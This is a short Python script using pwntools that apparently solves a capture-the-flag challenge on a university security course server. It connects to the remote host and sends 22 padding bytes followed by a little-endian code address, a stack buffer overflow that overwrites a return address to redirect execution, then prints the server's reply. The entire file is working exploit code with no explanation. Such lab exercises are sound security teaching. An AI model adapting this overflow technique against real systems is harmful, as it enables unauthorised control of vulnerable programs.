from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23154

s = remote(SERVER, PORT, timeout=9999)

s.recvline()
s.sendline(b'1'*22 + 0x080486f1.to_bytes(length=4,byteorder="little"))
s.recvline()
response = s.recvline()

print(response.decode())
